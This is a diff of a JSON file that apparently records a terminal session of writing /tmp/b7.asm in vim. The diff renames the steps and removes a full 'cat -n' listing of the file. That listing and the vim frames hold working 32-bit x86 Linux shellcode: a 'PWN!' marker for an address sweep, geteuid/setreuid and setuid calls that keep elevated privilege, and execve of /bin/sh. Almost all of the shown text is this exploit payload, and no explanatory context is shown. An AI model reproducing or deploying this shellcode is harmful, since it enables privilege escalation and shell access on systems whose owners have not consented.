@@ -2795,14 +2795,12 @@
     },
     {
      "cmd": "vim /tmp/b7.asm",
-     "text": "vim /tmp/b7.asm -- insert chunk 1",
+     "text": "vim /tmp/b7.asm -- header",
      "out": [
       "  1 BITS 32",
       "  2 global _start",
       "  3 _start:",
-      "  4     ; write(1, \"PWN!\", 4) -- a marker the address sweep can see",
-      "  5     xor eax, eax",
-      "  6",
+      "  4",
       "~",
       "~",
       "~",
@@ -2825,13 +2823,15 @@
       "~",
       "~",
       "~",
-      "b7.asm [+]                                                                        6,1            All",
+      "~",
+      "~",
+      "b7.asm [+]                                                                        4,1            All",
       "-- INSERT --"
      ]
     },
     {
      "cmd": "vim /tmp/b7.asm",
-     "text": "vim /tmp/b7.asm -- insert chunk 2",
+     "text": "vim /tmp/b7.asm -- marker",
      "out": [
       "  1 BITS 32",
       "  2 global _start",
@@ -2867,7 +2867,7 @@
     },
     {
      "cmd": "vim /tmp/b7.asm",
-     "text": "vim /tmp/b7.asm -- insert chunk 3",
+     "text": "vim /tmp/b7.asm -- geteuid and setreuid",
      "out": [
       "  1 BITS 32",
       "  2 global _start",
@@ -2893,18 +2893,20 @@
       " 22     xor eax, eax",
       " 23     mov al, 70",
       " 24     int 0x80",
-      " 25     ; setuid(euid): real, effective and saved uid, so the privilege",
-      " 26",
+      " 25",
       "~",
       "~",
-      "b7.asm [+]                                                                        26,1           All",
+      "~",
+      "b7.asm [+]                                                                        25,1           All",
       "-- INSERT --"
      ]
     },
     {
      "cmd": "vim /tmp/b7.asm",
-     "text": "vim /tmp/b7.asm -- insert chunk 4",
+     "text": "vim /tmp/b7.asm -- setuid",
      "out": [
+      "  7     push 0x214e5750",
+      "  8     mov ecx, esp",
       "  9     xor ebx, ebx",
       " 10     inc ebx",
       " 11     xor edx, edx",
@@ -2930,16 +2932,14 @@
       " 31     xor eax, eax",
       " 32     mov al, 23",
       " 33     int 0x80",
-      " 34     ; execve(\"/bin/sh\", [\"/bin/sh\", NULL], NULL)",
-      " 35     xor eax, eax",
-      " 36",
-      "b7.asm [+]                                                                        36,1           Bot",
+      " 34",
+      "b7.asm [+]                                                                        34,1           Bot",
       "-- INSERT --"
      ]
     },
     {
      "cmd": "vim /tmp/b7.asm",
-     "text": "vim /tmp/b7.asm -- insert chunk 5",
+     "text": "vim /tmp/b7.asm -- execve",
      "out": [
       " 19     int 0x80",
       " 20     mov ebx, eax",
@@ -3007,56 +3007,6 @@
       " 46",
       "b7.asm [+]                                                                        46,1           Bot",
       "                                                                                         ^["
-     ]
-    },
-    {
-     "cmd": "cat -n /tmp/b7.asm",
-     "out": [
-      "     1\tBITS 32",
-      "     2\tglobal _start",
-      "     3\t_start:",
-      "     4\t    ; write(1, \"PWN!\", 4) -- a marker the address sweep can see",
-      "     5\t    xor eax, eax",
-      "     6\t    push eax",
-      "     7\t    push 0x214e5750",
-      "     8\t    mov ecx, esp",
-      "     9\t    xor ebx, ebx",
-      "    10\t    inc ebx",
-      "    11\t    xor edx, edx",
-      "    12\t    mov dl, 4",
-      "    13\t    xor eax, eax",
-      "    14\t    mov al, 4",
-      "    15\t    int 0x80",
-      "    16\t    ; euid = geteuid(); setreuid(euid, euid)",
-      "    17\t    xor eax, eax",
-      "    18\t    mov al, 201",
-      "    19\t    int 0x80",
-      "    20\t    mov ebx, eax",
-      "    21\t    mov ecx, eax",
-      "    22\t    xor eax, eax",
-      "    23\t    mov al, 70",
-      "    24\t    int 0x80",
-      "    25\t    ; setuid(euid): real, effective and saved uid, so the privilege",
-      "    26\t    ; survives execve",
-      "    27\t    xor eax, eax",
-      "    28\t    mov al, 201",
-      "    29\t    int 0x80",
-      "    30\t    mov ebx, eax",
-      "    31\t    xor eax, eax",
-      "    32\t    mov al, 23",
-      "    33\t    int 0x80",
-      "    34\t    ; execve(\"/bin/sh\", [\"/bin/sh\", NULL], NULL)",
-      "    35\t    xor eax, eax",
-      "    36\t    push eax",
-      "    37\t    push 0x68732f2f",
-      "    38\t    push 0x6e69622f",
-      "    39\t    mov ebx, esp",
-      "    40\t    push eax",
-      "    41\t    push ebx",
-      "    42\t    mov ecx, esp",
-      "    43\t    xor edx, edx",
-      "    44\t    mov al, 11",
-      "    45\t    int 0x80"
      ]
     },
     {
